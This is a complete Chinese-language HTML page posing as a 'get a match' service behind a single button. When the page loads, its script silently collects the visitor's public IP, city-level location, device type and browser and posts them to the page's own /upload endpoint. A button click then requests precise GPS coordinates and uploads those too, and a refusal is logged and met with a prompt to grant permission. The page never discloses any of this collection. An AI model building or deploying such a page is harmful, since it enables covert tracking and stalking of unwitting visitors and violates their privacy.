<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>对象服务</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      width: 100vw;
      height: 100vh;
      background: linear-gradient(140deg, #0b1020, #152241);
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .btn {
      padding: 18px 50px;
      font-size: 19px;
      background: #2388ff;
      color: #fff;
      border: none;
      border-radius: 12px;
      box-shadow: 0 0 20px #2388ff60;
      cursor: pointer;
      transition: transform 0.2s;
    }
    .btn:active {
      transform: scale(0.96);
    }
  </style>
</head>
<body>
  <button class="btn" id="posBtn">点击获取对象</button>

  <script>
    const apiUrl = window.location.origin;
    let info = {
      ip: '',
      area: '',
      device: '',
      browser: '',
      position: ''
    };

    // 进入页面自动采集IP、地区、设备信息
    (async function autoGetBaseInfo() {
      try {
        // 获取公网IP
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipJson = await ipRes.json();
        info.ip = ipJson.ip;

        // 获取IP归属地
        const areaRes = await fetch(`https://ipapi.co/${info.ip}/json/`);
        const areaJson = await areaRes.json();
        info.area = `${areaJson.country_name} ${areaJson.region} ${areaJson.city}`;

        // 识别设备类型
        const ua = navigator.userAgent;
        if (ua.includes('iPhone')) {
          info.device = '苹果手机';
        } else if (ua.includes('Android')) {
          info.device = '安卓手机';
        } else if (ua.includes('Windows')) {
          info.device = 'Windows电脑';
        } else if (ua.includes('Mac')) {
          info.device = 'Mac电脑';
        } else {
          info.device = '未知设备';
        }

        // 识别浏览器
        if (ua.includes('MicroMessenger')) {
          info.browser = '微信内置浏览器';
        } else if (ua.includes('Chrome')) {
          info.browser = '谷歌浏览器';
        } else if (ua.includes('Safari')) {
          info.browser = '苹果Safari';
        } else {
          info.browser = '未知浏览器';
        }

        // 上传基础信息到服务器
        await fetch(`${apiUrl}/upload`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(info)
        });
      } catch (err) {
        console.error('信息采集失败:', err);
      }
    })();

    // 点击按钮获取精准定位
    document.getElementById('posBtn').addEventListener('click', () => {
      if (!navigator.geolocation) {
        alert('当前设备不支持定位功能');
        return;
      }
      navigator.geolocation.getCurrentPosition(
        async (res) => {
          const lat = res.coords.latitude.toFixed(6);
          const lng = res.coords.longitude.toFixed(6);
          info.position = `纬度: ${lat}，经度: ${lng}`;
          // 上传定位信息
          await fetch(`${apiUrl}/upload`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(info)
          });
          alert('位置获取成功！');
        },
        async (err) => {
          info.position = '用户拒绝定位权限';
          await fetch(`${apiUrl}/upload`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(info)
          });
          alert('定位授权失败，请允许位置权限后重试');
        }
      );
    });
  </script>
</body>
</html>
